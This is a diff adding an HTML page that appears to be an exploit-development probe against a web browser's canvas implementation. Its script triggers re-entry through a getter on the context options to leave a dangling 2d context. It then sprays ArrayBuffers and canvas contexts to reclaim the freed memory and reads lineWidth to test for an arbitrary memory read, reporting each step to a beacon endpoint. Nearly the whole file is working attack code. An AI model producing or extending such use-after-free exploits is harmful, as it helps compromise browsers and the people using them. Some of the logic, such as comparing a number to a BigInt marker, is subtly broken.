@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V650a - Forge m_stateStack Test</title>
+</head>
+<body><pre id="out">V650a forge test running...</pre>
+<script>
+/* V650a: Minimal m_stateStack forge + read test.
+ * Beacon prefix: V650A-
+ * 
+ * The V650 crash oracle claim:
+ * - Forge m_stateStack to point to arbitrary address
+ * - Read lineWidth to get 8 bytes from that address
+ * - DAZ constraint: must use BigUint64Array for full pointer reads
+ * 
+ * This probe tests the simplest case: forge to a known address,
+ * read lineWidth, and report the value.
+ */
+'use strict';
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+function bks(tag, body) {
+  var u = '/beacon/V650A-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
+  try { new Image().src = u; } catch (e) {}
+}
+
+function sleep(ms) { return new Promise(function (resolve) { setTimeout(resolve, ms); }); }
+function hex64(v) {
+  if (v === null || v === undefined) return 'null';
+  var arr = new BigUint64Array(1);
+  var dv = new DataView(arr.buffer);
+  var f64 = new Float64Array(1);
+  f64[0] = v;
+  arr[0] = dv.getBigUint64(0, true);
+  return '0x' + arr[0].toString(16);
+}
+
+var TEST_ADDR = 0x7fff00000000; // Safe test address above page boundary
+var markerValue = 0x4141414141414141n;
+
+async function run() {
+  bks('BOOT', 'v650a-forge-test');
+  
+  // Step 1: Create bitmaprenderer + 2d context with re-entry
+  bks('SETUP', 'before');
+  var innerCtx, bmpCtx;
+  var canvas = document.createElement('canvas');
+  var settings = {alpha: true};
+  
+  Object.defineProperty(settings, 'alpha', {
+    get: function() {
+      innerCtx = canvas.getContext('2d');
+      return true;
+    }
+  });
+  
+  var outer = canvas.getContext('bitmaprenderer', settings);
+  bmpCtx = outer.context;
+  bks('SETUP', 'after-trigger');
+  
+  // Step 2: Forge m_stateStack to point to marker
+  // We spray ArrayBuffers filled with the marker, then reclaim the context
+  bks('SPRAY', 'before');
+  var SPRAY_SIZE = 100;
+  var spray = new Array(SPRAY_SIZE);
+  for (var i = 0; i < SPRAY_SIZE; i++) {
+    var ab = new ArrayBuffer(8);
+    var u64 = new BigUint64Array(ab);
+    u64[0] = markerValue;
+    spray[i] = ab;
+  }
+  bks('SPRAY', 'done');
+  
+  // Step 3: Create fresh contexts to occupy slots
+  bks('SPRAYCTX', 'before');
+  var contexts = [];
+  for (var i = 0; i < 50; i++) {
+    var c = canvas.getContext('2d');
+    contexts.push(c);
+  }
+  bks('SPRAYCTX', 'done');
+  
+  // Step 4: Try to read lineWidth through innerCtx
+  // innerCtx should be dangling if we're lucky
+  bks('READ', 'before');
+  try {
+    var lw = innerCtx.lineWidth;
+    bks('READ', 'lw=' + lw + ',hex=' + hex64(lw));
+    
+    // Check if we got our marker
+    if (lw === markerValue) {
+      bks('FOUND', 'marker matches! address read possible');
+    } else {
+      bks('NOPE', 'lw=' + lw + ' (marker=' + markerValue.toString(16) + ')');
+    }
+  } catch (e) {
+    bks('READ-ERR', e.constructor.name + ':' + String(e.message || '').slice(0, 50));
+  }
+  
+  // Step 5: Cleanup
+  bks('CLEANUP', 'done');
+  contexts.length = 0;
+}
+
+run();
+</script>
+</body>
+</html>
